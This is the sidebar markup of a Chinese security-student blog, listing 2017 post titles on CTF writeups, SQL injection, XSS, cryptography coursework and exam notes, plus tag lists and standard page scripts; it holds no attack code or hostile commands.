            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2017/12/24/密码学课程设计之二手撸AES加解密程序/" >密码学课程设计之二手撸AES加解密程序</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2017/12/24/密码学课程设计一之维吉尼亚唯密文破解/" >密码学课程设计一之维吉尼亚唯密文破解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2017/12/24/密码学课程设计二之手撸DES加解密程序/" >密码学课程设计二之手撸DES加解密程序</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/2017/12/19/安恒12月赛之VSCMS审计/" >安恒12月赛之VSCMS审计</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2017/12/17/安恒杯-12月月赛/" >安恒杯-12月月赛</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/parse-url函数小记/" >parse_url函数小记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/2017/12/14/pwnhub成功就是要梭哈之学习记录/" >pwnhub成功就是要梭哈之学习记录</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/13</span><a class="archive-post-title" href= "/2017/12/13/密码学课程3道古典密码题目/" >密码学课程3道古典密码题目</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/13</span><a class="archive-post-title" href= "/2017/12/13/padding-oracle和cbc翻转攻击/" >padding oracle和cbc翻转攻击</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/11</span><a class="archive-post-title" href= "/2017/12/11/2017-12-11学习笔记/" >2017.12.11学习笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/11</span><a class="archive-post-title" href= "/2017/12/11/Jarvis-OJ-Crypto/" >Jarvis-OJ-Crypto</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2017/11/27/算法上机题复习/" >算法上机题复习</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2017/11/27/湖湘杯复赛web400/" >湖湘杯复赛web400</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/2017/11/25/湖湘杯复赛web题解/" >湖湘杯复赛web题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2017/11/19/近期做的其他平台的3道注入题/" >近期做的其他平台的3道注入题</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/18</span><a class="archive-post-title" href= "/2017/11/18/第三届上海AWD线下赛感悟/" >第三届上海AWD线下赛感悟</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2017/11/12/MCTF-flappybird题解/" >MCTF-flappybird题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2017/11/12/hctf的3道web题题解/" >hctf的3道web题题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海赛的RSA研究/" >上海赛的RSA研究</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海线上赛web题解/" >上海线上赛web题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/2017/10/30/XDCTF线下赛经历及感悟/" >XDCTF线下赛经历及感悟</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/29</span><a class="archive-post-title" href= "/2017/10/29/安恒总决赛的一道代码审计/" >安恒总决赛的一道代码审计</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/28</span><a class="archive-post-title" href= "/2017/10/28/geekgame部分题解/" >geekgame部分web题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2017/10/27/江苏第六届省赛线下AWD感触/" >江苏第六届省赛线下AWD感触</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2017/10/23/BDCTF第一轮初赛web题解/" >BDCTF第一轮初赛web题解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/22</span><a class="archive-post-title" href= "/2017/10/22/ss和kali源遇到的bug记录/" >ss和kali源遇到的bug记录</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/22</span><a class="archive-post-title" href= "/2017/10/22/安恒秋季线下赛决赛wp/" >安恒秋季线下赛决赛wp</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/15</span><a class="archive-post-title" href= "/2017/10/15/安恒杯Web安全测试赛秋季赛资格赛部分wp/" >安恒杯Web安全测试赛秋季赛部分wp</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/12</span><a class="archive-post-title" href= "/2017/10/12/安恒秋季测试赛练习赛web部分wp/" >安恒秋季测试赛web部分wp</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/08</span><a class="archive-post-title" href= "/2017/09/08/XSS挑战之旅-bugku/" >XSS挑战之旅-bugku</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2017/09/06/过气的00截断/" >过气的00截断</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2017/09/06/有趣的-htaccess/" >有趣的.htaccess</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/28</span><a class="archive-post-title" href= "/2017/08/28/sql注入—into-outfile、load-file/" >sql注入—into outfile、load_file()</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2017/08/21/Xman线下赛源码审计/" >Xman线下赛源码审计</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/19</span><a class="archive-post-title" href= "/2017/08/19/SSRF学习/" >SSRF学习</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2017/08/18/xml注入攻击学习/" >xml注入攻击学习</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2017/08/18/密码学自学/" >密码学自学</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2017/08/17/Hexo报错，DEP0061/" >Hexo报错，DEP0061</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2017/08/16/jarvisoj-web/" >jarvisoj-web</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/2017/08/07/搭建ShadowSocks实现翻墙/" >搭建ShadowSocks实现翻墙</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/25</span><a class="archive-post-title" href= "/2017/07/25/RSA常用工具/" >RSA常用工具</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/25</span><a class="archive-post-title" href= "/2017/07/25/github博客之page-build-failed/" >github博客之page build failed</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/24</span><a class="archive-post-title" href= "/2017/07/24/docker基础学习/" >docker基础学习</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2017/07/23/SQLi-LABS(Challenges)(Less-54-Less-65)/" >SQLi-LABS(Challenges)(Less-54 ~ Less-65)</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2017/07/23/SQLi-LABS(Stacked)(Less-39 ~ Less-53)/" >SQLi-LABS(Stacked)(Less-39 ~ Less-53)</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/22</span><a class="archive-post-title" href= "/2017/07/22/PHP函数黑魔法小总结/" >PHP函数黑魔法小总结</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/20</span><a class="archive-post-title" href= "/2017/07/20/SQLi-LABS(Adv)(Less-23 ~ Less-38)/" >SQLi-LABS(Adv)(Less-23 ~ Less-38)</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "/2017/07/19/sql注入的一些技巧原理/" >sql注入的一些技巧原理</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/18</span><a class="archive-post-title" href= "/2017/07/18/SQLi-LABS(Basic)(Less-1 ~ Less-22)/" >SQLi-LABS(Basic)(Less-1 ~ Less-22)</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/18</span><a class="archive-post-title" href= "/2017/07/18/flask的excel导入与导出/" >flask的excel导入与导出</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/12</span><a class="archive-post-title" href= "/2017/07/12/git学习-边学边记录/" >.git学习-边学边记录</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/11</span><a class="archive-post-title" href= "/2017/07/11/sniperoj-web-边做边记录/" >sniperoj-web</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/10</span><a class="archive-post-title" href= "/2017/07/10/曼切斯特与差分曼切斯特/" >曼切斯特与差分曼切斯特</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/28</span><a class="archive-post-title" href= "/2017/06/28/马原闲聊/" >马原闲聊</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/28</span><a class="archive-post-title" href= "/2017/06/28/openctf-writeup/" >openctf-writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/26</span><a class="archive-post-title" href= "/2017/06/26/记一次蛇皮的微机实验考试/" >记一次蛇皮的微机实验考试</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/24</span><a class="archive-post-title" href= "/2017/06/24/计网复习总结/" >计网复习总结</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/22</span><a class="archive-post-title" href= "/2017/06/22/闲着无聊随便写的微机代码/" >闲着无聊随便写的微机代码</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/21</span><a class="archive-post-title" href= "/2017/06/21/微机实验考试代码/" >微机实验考试代码</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/21</span><a class="archive-post-title" href= "/2017/06/21/RSA算法研究/" >RSA算法研究</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2017/06/20/GCTF的一道php反序列化题目/" >GCTF的一道php反序列化题目</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/19</span><a class="archive-post-title" href= "/2017/06/19/CRC爆破总结/" >CRC32爆破总结</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2017/06/18/陕西杯web详解/" >陕西杯web详解</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2017/06/18/微机实验代码/" >微机实验代码</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CUMTCTF-初赛/" >CUMTCTF-初赛</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/椭圆加密算法ECC/" >椭圆加密算法ECC</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/17</span><a class="archive-post-title" href= "/2017/05/17/2017-CUMTCTF-Final/" >2017-CUMTCTF-Final</a>
        </li>
    
    </div>
  </div>
        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
    
        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
    
        <span class="sidebar-tag-name" data-tags="CBC"><span class="iconfont-archer">&#xe606;</span>CBC</span>
    
        <span class="sidebar-tag-name" data-tags="CRC"><span class="iconfont-archer">&#xe606;</span>CRC</span>
    
        <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
    
        <span class="sidebar-tag-name" data-tags="hexo"><span class="iconfont-archer">&#xe606;</span>hexo</span>
    
        <span class="sidebar-tag-name" data-tags="php_black_magic"><span class="iconfont-archer">&#xe606;</span>php_black_magic</span>
    
        <span class="sidebar-tag-name" data-tags="RSA"><span class="iconfont-archer">&#xe606;</span>RSA</span>
    
        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
    
        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
    
        <span class="sidebar-tag-name" data-tags="cms"><span class="iconfont-archer">&#xe606;</span>cms</span>
    
        <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
    
        <span class="sidebar-tag-name" data-tags=".git"><span class="iconfont-archer">&#xe606;</span>.git</span>
    
        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
    
        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
    
        <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
    
        <span class="sidebar-tag-name" data-tags="ShadowSocks"><span class="iconfont-archer">&#xe606;</span>ShadowSocks</span>
    
        <span class="sidebar-tag-name" data-tags="xml"><span class="iconfont-archer">&#xe606;</span>xml</span>
    
        <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
    
        <span class="sidebar-tag-name" data-tags=".htaccess"><span class="iconfont-archer">&#xe606;</span>.htaccess</span>
    
        <span class="sidebar-tag-name" data-tags="ECC"><span class="iconfont-archer">&#xe606;</span>ECC</span>
    
        <span class="sidebar-tag-name" data-tags="计网考试"><span class="iconfont-archer">&#xe606;</span>计网考试</span>
    
        <span class="sidebar-tag-name" data-tags="心情随笔"><span class="iconfont-archer">&#xe606;</span>心情随笔</span>
    
        <span class="sidebar-tag-name" data-tags="flask"><span class="iconfont-archer">&#xe606;</span>flask</span>
    
        <span class="sidebar-tag-name" data-tags="websummary"><span class="iconfont-archer">&#xe606;</span>websummary</span>
    
        <span class="sidebar-tag-name" data-tags="微机实验"><span class="iconfont-archer">&#xe606;</span>微机实验</span>
    
        <span class="sidebar-tag-name" data-tags="微机考试"><span class="iconfont-archer">&#xe606;</span>微机考试</span>
    
        <span class="sidebar-tag-name" data-tags="马原考试"><span class="iconfont-archer">&#xe606;</span>马原考试</span>
    
        <span class="sidebar-tag-name" data-tags="微机实验考试"><span class="iconfont-archer">&#xe606;</span>微机实验考试</span>
    
        <span class="sidebar-tag-name" data-tags="Algorithm"><span class="iconfont-archer">&#xe606;</span>Algorithm</span>
    
        <span class="sidebar-tag-name" data-tags="algorithm"><span class="iconfont-archer">&#xe606;</span>algorithm</span>
    
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
    缺失模块。<br/>
    1、请确保node版本大于6.2<br/>
    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
    3、在根目录_config.yml里添加配置：
    <pre style="color: #787878; font-size: 0.6rem;">
jsonContent:
  meta: false
  pages: false
  posts:
    title: true
    date: true
    path: true
    text: false
    raw: false
    content: false
    slug: false
    updated: false
    comments: false
    link: false
    permalink: false
    excerpt: false
    categories: true
    tags: true</pre>
    </div> 
    <div class="sidebar-tags-list"></div>
</div>
        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
        <span class="sidebar-category-name" data-categories="web"><span class="iconfont-archer">&#xe60a;</span>web</span>
    
        <span class="sidebar-category-name" data-categories="crypto"><span class="iconfont-archer">&#xe60a;</span>crypto</span>
    
        <span class="sidebar-category-name" data-categories="hexo"><span class="iconfont-archer">&#xe60a;</span>hexo</span>
    
        <span class="sidebar-category-name" data-categories="cms"><span class="iconfont-archer">&#xe60a;</span>cms</span>
    
        <span class="sidebar-category-name" data-categories="docker"><span class="iconfont-archer">&#xe60a;</span>docker</span>
    
        <span class="sidebar-category-name" data-categories="git"><span class="iconfont-archer">&#xe60a;</span>git</span>
    
        <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
    
        <span class="sidebar-category-name" data-categories="翻墙"><span class="iconfont-archer">&#xe60a;</span>翻墙</span>
    
        <span class="sidebar-category-name" data-categories="misc"><span class="iconfont-archer">&#xe60a;</span>misc</span>
    
        <span class="sidebar-category-name" data-categories="awd"><span class="iconfont-archer">&#xe60a;</span>awd</span>
    
        <span class="sidebar-category-name" data-categories="计网考试"><span class="iconfont-archer">&#xe60a;</span>计网考试</span>
    
        <span class="sidebar-category-name" data-categories="心情随笔"><span class="iconfont-archer">&#xe60a;</span>心情随笔</span>
    
        <span class="sidebar-category-name" data-categories="flask"><span class="iconfont-archer">&#xe60a;</span>flask</span>
    
        <span class="sidebar-category-name" data-categories="websummary"><span class="iconfont-archer">&#xe60a;</span>websummary</span>
    
        <span class="sidebar-category-name" data-categories="微机实验"><span class="iconfont-archer">&#xe60a;</span>微机实验</span>
    
        <span class="sidebar-category-name" data-categories="微机考试"><span class="iconfont-archer">&#xe60a;</span>微机考试</span>
    
        <span class="sidebar-category-name" data-categories="马原考试"><span class="iconfont-archer">&#xe60a;</span>马原考试</span>
    
        <span class="sidebar-category-name" data-categories="Algorithm"><span class="iconfont-archer">&#xe60a;</span>Algorithm</span>
    
        <span class="sidebar-category-name" data-categories="algorithm"><span class="iconfont-archer">&#xe60a;</span>algorithm</span>
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>
    </div>
</div> 
    <script>
    var siteMeta = {
        root: "/",
        author: "一叶飘零"
    }
</script>
    <!-- CDN failover -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ === 'undefined')
        {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
        }
    </script>
    <script src="/scripts/main.js"></script>
    <!-- algolia -->
    
    <!-- busuanzi  -->
    
    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
    <!-- CNZZ  -->
    
    </div>
    <!-- async load share.js -->
    
        <script src="/scripts/share.js" async></script>    
     
    </body>
</html>


